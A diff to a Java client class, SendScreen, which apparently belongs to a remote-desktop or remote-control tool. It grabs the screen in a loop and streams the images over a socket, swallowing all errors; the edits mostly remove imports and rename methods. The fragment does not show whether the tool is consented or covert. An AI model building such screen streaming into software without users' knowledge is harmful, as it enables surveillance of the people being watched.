@@ -1,10 +1,6 @@
 package me.client.send;
 
-import com.sun.jna.Structure;
-import com.sun.jna.platform.win32.Kernel32;
 import com.sun.jna.platform.win32.User32;
-import com.sun.jna.platform.win32.WinDef;
-import me.client.Client;
 import me.client.utils.LoadDLL;
 import me.client.utils.MessageFlags;
 import me.client.utils.SendMessage;
@@ -13,17 +9,11 @@ import javax.imageio.IIOImage;
 import javax.imageio.ImageIO;
 import javax.imageio.ImageWriteParam;
 import javax.imageio.ImageWriter;
-import javax.jws.soap.SOAPBinding;
 import java.awt.*;
 import java.awt.event.InputEvent;
-import java.awt.event.KeyEvent;
 import java.awt.event.MouseEvent;
 import java.awt.image.BufferedImage;
-import java.awt.image.ColorModel;
 import java.io.ByteArrayOutputStream;
-import java.io.DataOutputStream;
-import java.io.File;
-import java.io.OutputStream;
 import java.net.Socket;
 import java.util.Iterator;
 
@@ -57,14 +47,14 @@ public class SendScreen extends Thread{
     @Override
     public void run() {
         try {
-            int w = LoadDLL.instance.GetWidth();
-            int h = LoadDLL.instance.GetHeight();
+            int w = LoadDLL.instance.$Get$Width();
+            int h = LoadDLL.instance.$Get$Height();
             Rectangle rectangle = new Rectangle(w,h);
-            SendMessage.SendHead(MessageFlags.SHOW_SCREEN,socket);
+            SendMessage.sendHead(MessageFlags.SHOW_SCREEN,socket);
             while (run) {
                 Thread.sleep(290);
                 byte[] bytes2 = getImage(rectangle);
-                SendMessage.Send(MessageFlags.UPDATE_SCREEN,bytes2,socket);
+                SendMessage.send(MessageFlags.UPDATE_SCREEN,bytes2,socket);
             }
         }catch (Exception e) {
         }
